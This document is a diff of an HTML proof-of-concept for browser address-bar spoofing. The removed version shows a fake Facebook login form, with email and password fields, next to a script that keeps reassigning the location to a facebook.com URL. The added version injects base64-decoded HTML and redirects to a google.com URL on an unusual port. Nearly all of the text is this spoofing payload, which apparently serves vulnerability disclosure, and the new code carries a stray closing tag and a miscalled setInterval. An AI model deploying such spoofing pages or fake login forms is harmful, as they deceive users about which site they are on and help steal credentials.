@@ -1,20 +1,15 @@
-<!DOCTYPE html>
 <html>
-<head>
-    <title>Brave Address Bar Spoofing PoC</title>
-</head>
+<title>Not Chrome</title>
 <body>
-    <h1>This is a Fake Facebook Login Page</h1>
-    <form>
-        Email: <input type="text" name="username" placeholder="Enter email"><br>
-        Password: <input type="password" name="password" placeholder="Enter password">
-    </form>
-
-    <script>
-        function spoofAddressBar() {
-            location = "https://facebook.com:989";  // Spoofs the address bar
-        }
-        setInterval(spoofAddressBar, 10);
-    </script>
+<script>
+ function spoof()
+ {
+ var data = 'PGh0bWw+PGJvZHk+PGgxIGFsaWduPSJjZW50ZXIiPlRoaXMgaXMgZGVmaW5pdGVseSBub3QgT3BlcmEuPC9oMT48L2JvZHk+PC9odG1sPg=='; // base64 encoded html content
+ document.body.innerHTML=atob(data);
+ window.location.assign("https://www.google.com:1231");
+ }
+setInterval(spoof(),100000);
+</script>
+</script>
 </body>
 </html>
